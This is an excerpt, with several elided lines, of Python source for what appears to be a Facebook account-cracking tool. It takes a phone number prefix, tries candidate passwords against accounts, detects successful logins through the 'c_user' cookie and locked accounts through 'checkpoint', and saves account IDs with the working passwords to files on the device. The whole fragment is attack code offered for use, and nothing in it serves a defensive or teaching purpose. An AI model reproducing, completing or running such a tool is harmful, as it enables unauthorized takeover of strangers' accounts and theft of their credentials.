...
def random_number():
    ...
    print(logo)
    kode = ('92309')
    print('\n any country full number without +\n example: 923068043579')
    input(' put full number: ')
    ...
    print('[•] OK ids Ssved : /sdcard/AKING-OK.txt\n[•] CP ids Saved : /sdcard/AKING-CP.txt')
    print('\033[1;37m(!)═══════════════════════════════════════')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[Successfull-BXI] '+cid+' | '+ps)
                #+'\n[Cookies]-> '+coki)
                open('/sdcard/AKING-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\033[1;31m[Check-Point-BXI] '+cid+' | '+ps)
                open('/sdcard/AKING-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\033[1;37m %s|\033[1;97mOK:%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
main()
